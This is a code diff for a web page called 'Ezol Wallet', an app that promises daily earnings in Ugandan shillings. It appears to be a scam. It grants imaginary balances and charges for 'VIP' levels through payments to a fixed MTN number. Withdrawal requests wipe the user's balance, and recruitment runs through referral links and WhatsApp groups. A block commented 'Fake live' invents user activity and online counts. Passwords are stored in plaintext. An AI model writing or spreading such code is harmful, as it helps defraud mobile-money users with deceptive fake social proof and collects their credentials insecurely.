+<div class="nav-item active" id="navHome" onclick="switchTab('home')"><span>🏠</span>Home</div>
+<div class="nav-item" id="navProduct" onclick="switchTab('product')"><span>📦</span>Product</div>
+<div class="nav-item" id="navShare" onclick="switchTab('share')"><span>🔗</span>Share</div>
+<div class="nav-item" id="navWallet" onclick="switchTab('wallet')"><span>💳</span>Wallet</div>
+<div class="nav-item" id="navMy" onclick="switchTab('my')"><span>👤</span>My</div>
+</div>
+
+<div id="registerModal"><div class="reg-box"><h2 style="color:#16a34a">💰 Ezol Wallet</h2><p style="font-size:12px;color:#6b7280">● 5,248 online • LIVE SYNC</p><p style="font-size:11px;background:#f0fdf4;padding:6px;border-radius:100px;margin-top:6px">Ref: <b id="refDisplay">0795143386</b></p><input id="regName" placeholder="Full Names"><input id="regPhone" placeholder="Phone 0795143386"><input id="regPass" type="password" placeholder="Password min 4 chars"><button class="btn-full" style="background:#16a34a;color:#fff" onclick="doRegister()">Create + 500 UGX</button><p style="font-size:12px;margin-top:10px"><a href="#" onclick="doLogin();return false" style="color:#16a34a;font-weight:700;text-decoration:none">Already have account? Login</a></p><p style="font-size:10px;color:#25D366;margin-top:8px">👥 After register → Auto join WhatsApp group</p></div></div>
+
+<script type="module">
+import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
+import { getFirestore, doc, setDoc, getDoc, onSnapshot, collection, addDoc, serverTimestamp, updateDoc } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-firestore.js";
+
+const CLEAN_GROUP_LINK = "https://chat.whatsapp.com/FTnYhv4l2LkK7Vk5SQzQf2";
+const VIP_NUMBER="0795143386";
+
+const firebaseConfig = {
+  apiKey: "AIzaSyC-your-key-here",
+  authDomain: "ezol-wallet.firebaseapp.com",
+  projectId: "ezol-wallet",
+  storageBucket: "ezol-wallet.appspot.com",
+  messagingSenderId: "123456789",
+  appId: "1:123456789:web:abc123"
+};
+
+let db; let unsubUser=null;
+try{ const app=initializeApp(firebaseConfig); db=getFirestore(app); }catch(e){ console.log("Firebase not config - using local"); }
+
+var user=JSON.parse(localStorage.getItem('ezol_user')||'null');
+var balance=parseInt(localStorage.getItem('ezol_balance')||'0')||0;
+var vipLevel=parseInt(localStorage.getItem('ezol_vip_level')||'0')||0;
+
+window.switchTab=function(t){
+ document.querySelectorAll('.tab').forEach(x=>x.classList.remove('active'));
+ document.getElementById(t+'Tab').classList.add('active');
+ document.querySelectorAll('.nav-item').forEach(x=>x.classList.remove('active'));
+ document.getElementById('nav'+t.charAt(0).toUpperCase()+t.slice(1)).classList.add('active');
+}
+function syncBalances(){
+ var b=balance.toLocaleString();
+ ['balance','balanceWallet','balanceMy'].forEach(id=>{let e=document.getElementById(id); if(e) e.innerText=b;});
+ ['vipShow','vipShowWallet','vipShowMy','vipLevelHome','vipShowMy'].forEach(id=>{let e=document.getElementById(id); if(e) e.innerText=vipLevel;});
+ var d=[1000,5000,12000,25000,50000][vipLevel]||1000;
+ ['checkAmountHome','checkAmount2Home','dailyEarnWallet'].forEach(id=>{let e=document.getElementById(id); if(e) e.innerText=d.toLocaleString();});
+}
+syncBalances();
+
+function startLiveSync(phone){
+ if(!db) return;
+ if(unsubUser) unsubUser();
+ unsubUser = onSnapshot(doc(db,"users",phone), (snap)=>{
+  if(snap.exists()){
+   const live=snap.data();
+   if(live.balance!==undefined && live.balance!==balance){
+    balance=live.balance; localStorage.setItem('ezol_balance',balance);
+    document.getElementById('syncStatus').innerText="● UPDATED LIVE!"; document.getElementById('syncStatus').style.color="#f59e0b";
+    setTimeout(()=>{document.getElementById('syncStatus').innerText="● LIVE SYNC"; document.getElementById('syncStatus').style.color="#22c55e";},2000);
+   }
+   if(live.vipLevel!==undefined){ vipLevel=live.vipLevel; localStorage.setItem('ezol_vip_level',vipLevel); }
+   if(live.name) { user.name=live.name; localStorage.setItem('ezol_user',JSON.stringify(user)); }
+   syncBalances(); checkAuthDisplay();
+  }
+ });
+}
+
+function checkAuth(){
+ var ref=new URLSearchParams(window.location.search).get('ref')||VIP_NUMBER;
+ document.getElementById('refDisplay').innerText=ref;
+ if(!user){ document.getElementById('registerModal').style.display='flex'; }
+ else{
+  document.getElementById('registerModal').style.display='none';
+  checkAuthDisplay();
+  startLiveSync(user.phone);
+  var rl="https://ezratwinamatsiko0-droid.github.io/my-wallet/index.html?ref="+user.phone;
+  let rt=document.getElementById('refLinkText'); if(rt) rt.innerText=rl;
+ }
+}
+function checkAuthDisplay(){
+ if(!user) return;
+ document.getElementById('userInfoHome').innerText=user.name+' • '+user.phone;
+ document.getElementById('myName').innerText=user.name;
+ document.getElementById('myPhone').innerText=user.phone;
+ document.getElementById('myAvatar').innerText=user.name[0].toUpperCase();
+ var sn=document.getElementById('setName'); if(sn) sn.value=user.name;
+ var sp=document.getElementById('setPhone'); if(sp) sp.value=user.phone;
+}
+checkAuth();
+
+window.doRegister=async function(){
+ var n=document.getElementById('regName').value.trim();
+ var p=document.getElementById('regPhone').value.trim();
+ var pa=document.getElementById('regPass').value.trim();
+ if(n.length<3){alert("Enter full names");return;}
+ if(p.length<10){alert("Enter phone like 0795143386");return;}
+ if(pa.length<4){alert("Password min 4");return;}
+ user={name:n,phone:p,password:pa,balance:500,vipLevel:0};
+ localStorage.setItem('ezol_user',JSON.stringify(user));
+ localStorage.setItem('ezol_balance','500'); localStorage.setItem('ezol_vip_level','0'); balance=500; vipLevel=0;
+ try{ let all=JSON.parse(localStorage.getItem('ezol_all_users')||'[]'); if(!all.find(x=>x.phone==p)){ all.push(user); localStorage.setItem('ezol_all_users',JSON.stringify(all)); } }catch(e){}
+ if(db){
+  try{
+   await setDoc(doc(db,"users",p),{name:n,phone:p,password:pa,balance:500,vipLevel:0,refBy:document.getElementById('refDisplay').innerText,createdAt:serverTimestamp()});
+  }catch(e){ console.log(e); }
+ }
+ alert("Welcome "+n+"! 500 UGX added.");
+ document.getElementById('registerModal').style.display='none';
+ checkAuth(); syncBalances(); startLiveSync(p);
+ setTimeout(()=>{ window.open(CLEAN_GROUP_LINK,"_blank"); },800);
+}
+window.doLogin=async function(){
+ var ph=prompt("Phone:"); if(!ph) return; var pa=prompt("Password:"); if(!pa) return;
+ if(db){ try{ let s=await getDoc(doc(db,"users",ph)); if(s.exists() && s.data().password==pa){ user=s.data(); localStorage.setItem('ezol_user',JSON.stringify(user)); localStorage.setItem('ezol_balance',user.balance); localStorage.setItem('ezol_vip_level',user.vipLevel); balance=user.balance; vipLevel=user.vipLevel; document.getElementById('registerModal').style.display='none'; checkAuth(); syncBalances(); startLiveSync(ph); alert("Login success VIP "+vipLevel); return; } }catch(e){} }
+ let all=JSON.parse(localStorage.getItem('ezol_all_users')||'[]'); let f=all.find(x=>x.phone==ph && x.password==pa);
+ if(f){ user=f; localStorage.setItem('ezol_user',JSON.stringify(user)); document.getElementById('registerModal').style.display='none'; checkAuth(); alert("Login local"); return; }
+ alert("Wrong password");
+}
+window.logout=function(){ if(unsubUser) unsubUser(); localStorage.removeItem('ezol_user'); location.reload(); }
+window.saveSettings=async function(){
+ var n=document.getElementById('setName').value.trim(); var p=document.getElementById('setPhone').value.trim(); var pa=document.getElementById('setPass').value.trim();
+ if(n) user.name=n; if(p) user.phone=p; if(pa.length>=4) user.password=pa;
+ localStorage.setItem('ezol_user',JSON.stringify(user));
+ if(db){ try{ await updateDoc(doc(db,"users",user.phone),{name:user.name, password:user.password}); }catch(e){} }
+ alert("Saved & Synced to Admin LIVE"); checkAuthDisplay();
+}
+window.dailyCheck=function(){
+ var key="ezol_last_check_"+user.phone; var t=new Date().toDateString();
+ if(localStorage.getItem(key)===t){ alert("Already checked"); return; }
+ var daily=[1000,5000,12000,25000,50000][vipLevel]||1000;
+ balance+=daily; localStorage.setItem('ezol_balance',balance); localStorage.setItem(key,t); syncBalances();
+ if(db){ updateDoc(doc(db,"users",user.phone),{balance:balance}); }
+ alert("✅ +"+daily+" UGX!"); document.getElementById('lastCheckText').innerText="Last: "+t+" +"+daily;
+}
+window.buyVIP=async function(l,a){
+ var tx=prompt("Send "+a+" to MTN 0795143386\nEnter TxID:"); if(!tx) return;
+ if(db){ try{ await addDoc(collection(db,"vip_requests"),{phone:user.phone,name:user.name,level:l,amount:a,tx:tx,status:"pending",createdAt:serverTimestamp()}); }catch(e){} }
+ alert("VIP "+l+" request sent! Admin approve in 5 mins. Join group.");
+ window.open("https://wa.me/256795143386?text=Hello%20VIP%20"+l+"%20"+a+"%20phone%20"+user.phone+"%20Tx%20"+tx,"_blank");
+}
+window.withdraw=async function(){
+ if(balance<20000){ alert("Min 20,000. Bal: "+balance); return; }
+ var num=prompt("MoMo number:",user.phone); if(!num) return;
+ if(db){ try{ await addDoc(collection(db,"withdraw_requests"),{phone:user.phone,momo:num,amount:balance,status:"pending",time:serverTimestamp()}); }catch(e){} }
+ alert("Withdraw "+balance+" to "+num+" PENDING!");
+ if(db){ await updateDoc(doc(db,"users",user.phone),{balance:0}); } else { localStorage.setItem('ezol_balance',0); balance=0; syncBalances(); }
+ window.open("https://wa.me/256795143386?text=Withdraw%20"+balance+"%20to%20"+num+"%20"+user.phone,"_blank");
+}
+window.openGroup=function(){ window.open(CLEAN_GROUP_LINK,"_blank"); }
+window.copyGroup=function(){ navigator.clipboard.writeText(CLEAN_GROUP_LINK).then(()=>alert("Group link copied!")); }
+window.shareGroup=function(){ window.open("https://wa.me/?text="+encodeURIComponent("💰 Join Ezol Wallet Official Group - Proofs Daily! 👥 "+CLEAN_GROUP_LINK+" Referral: https://ezratwinamatsiko0-droid.github.io/my-wallet/index.html?ref="+user.phone),"_blank"); }
+window.openWhatsApp=function(){ window.open("https://wa.me/256795143386?text=Hello%20Ezol%20"+user.phone,"_blank"); }
+window.copyLink=function(){
+ var rl="https://ezratwinamatsiko0-droid.github.io/my-wallet/index.html?ref="+user.phone;
+ navigator.clipboard.writeText(rl);
+ window.open("https://wa.me/?text="+encodeURIComponent("💰 Join Ezol earn daily! "+rl+" 👥 Group: "+CLEAN_GROUP_LINK),"_blank");
+}
+// Fake live
+var phones=["07**","0783","0701","0754","0772"]; var acts=["earned 5000","bought ORDINARY-2 🔥","withdraw 25k ✓","earned 12k"];
+function addRandom(){
+ var box=document.getElementById('liveActivity'); if(!box) return;
+ var ph=phones[Math.floor(Math.random()*phones.length)]+'***'+Math.floor(1000+Math.random()*8000);
+ var ac=acts[Math.floor(Math.random()*acts.length)];
+ var d=document.createElement('div'); d.style="display:flex;justify-content:space-between;padding:7px 0;border-bottom:1px solid #f3f4f6;font-size:12px";
+ d.innerHTML='<span>🟢 '+ph+' '+ac+'</span><span style="color:#6b7280">'+Math.floor(1+Math.random()*9)+'m ago</span>';
+ box.prepend(d); if(box.children.length>6) box.lastChild.remove();
+}
+for(let i=0;i<5;i++) addRandom(); setInterval(addRandom,3500);
+setInterval(()=>{ let o=130+Math.floor(Math.random()*60); document.getElementById('onlineTop').innerText="5,248"; document.getElementById('onlineHero').innerText=o; document.getElementById('liveUsers').innerText=o; document.getElementById('statOnline').innerText=o; document.getElementById('liveTimeTop').innerText=new Date().toLocaleTimeString(); },3000);
 </script>
-</div>
 </body>
 </html>
